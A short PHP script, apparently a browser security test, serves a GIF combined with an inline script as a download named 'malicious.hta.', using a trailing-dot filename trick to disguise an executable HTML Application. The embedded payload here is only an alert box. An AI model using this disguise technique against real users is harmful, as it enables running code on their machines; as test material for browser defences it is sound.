<?php
header("Content-Disposition: attachment; filename=malicious.hta.");
readfile('gif.gif');
echo "<SCRIPT>alert('HARLOW UMBRELLA');</SCRIPT>";
?>
